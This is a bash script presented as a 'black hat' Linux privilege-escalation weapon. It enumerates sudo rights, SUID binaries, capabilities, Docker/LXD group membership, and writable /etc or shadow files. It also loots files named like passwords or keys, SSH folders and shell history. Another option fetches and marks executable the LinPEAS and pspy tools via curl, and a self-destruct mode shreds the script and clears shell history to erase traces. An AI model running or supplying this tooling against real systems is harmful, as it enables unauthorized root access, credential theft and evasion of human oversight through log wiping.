#!/bin/bash
# black-privesc.sh — Jusot99's Black Hat PrivEsc Weapon
# Stealth. Power. Root. | Author: @jusot99

set +x
shopt -s expand_aliases

TMPDIR="/dev/shm/.ghost"
mkdir -p "$TMPDIR"
cd "$TMPDIR" || exit

BOLD="\e[1m"; RED="\e[31m"; GREEN="\e[32m"; YELLOW="\e[33m"; RESET="\e[0m"
s() { echo -e "${BOLD}${GREEN}[*] $1${RESET}"; }
w() { echo -e "${YELLOW}[!] $1${RESET}"; }
e() { echo -e "${RED}[-] $1${RESET}"; }

# =============== IDENTITY ===============
s "System Identity"
whoami
id
hostname -f
uname -a
cat /etc/os-release 2>/dev/null | grep PRETTY

# =============== PRIV ESC PATHS ===============
s "Sudo/SUID/Gcap Checks"
sudo -l 2>/dev/null
find / -perm -4000 -type f 2>/dev/null | grep -vE "/snap|/proc|/sys"
getcap -r / 2>/dev/null

# =============== DOCKER/LXD/NFS PATH ===============
s "Container Checks"
grep -qa docker /proc/1/cgroup && w "Inside Docker. Check /var/run/docker.sock"
getent group | grep -q docker && w "User in docker group"
getent group | grep -q lxd && w "User in lxd group"

s "Interesting Mounts/NFS"
mount | grep -E "nfs|tmpfs|overlay"

# =============== WRITABLE PLACES ===============
s "Writable Sensitive Paths"
find /etc -type f -writable 2>/dev/null
find / -type f -name "shadow" -writable 2>/dev/null

# =============== PERSISTENCE HOOKS ===============
s "Cron Jobs + Systemd Timers"
cat /etc/crontab 2>/dev/null
ls -la /etc/cron.* /var/spool/cron/crontabs 2>/dev/null
systemctl list-timers --all 2>/dev/null | head -n 10

# =============== SHELL ESCAPE =================
s "Shell Escape Clues"
env | grep -Ei 'editor|shell|term'
grep -E "bash|sh" /etc/passwd | grep -v nologin

# =============== LOOTING ===================
s "Live Loot (Secrets & Keys)"
find / -type f \( -name "*.bak" -o -name "*.old" -o -name "*~" -o -name "*password*" -o -name "*key*" \) 2>/dev/null | grep -v "/proc"

s ".ssh / History"
ls -la ~/.ssh 2>/dev/null
cat ~/.bash_history 2>/dev/null | tail -n 10

# =============== ACTIVE PROCESSES ===================
s "Interesting Running Processes"
ps aux | grep -Ei "root|nc|python|php|perl" | grep -v grep

# =============== OPTIONAL AUTO-TOOLS ===================
if [[ "$1" == "--auto-tools" ]]; then
  s "Pulling Ghost Recon Tools (LinPEAS, pspy)..."
  curl -sL https://raw.githubusercontent.com/carlospolop/PEASS-ng/master/linPEAS/linpeas.sh -o linpeas.sh
  curl -sL https://github.com/DominicBreuker/pspy/releases/latest/download/pspy64 -o pspy64
  chmod +x linpeas.sh pspy64
fi

# =============== CLEANUP ===================
if [[ "$1" == "--clean" ]]; then
  s "Self-Destruct Mode Enabled"
  shred -u "$0" >/dev/null 2>&1
  rm -rf "$TMPDIR"
  history -c
  unset HISTFILE
  s "Ghost vanished. No trace left."
fi
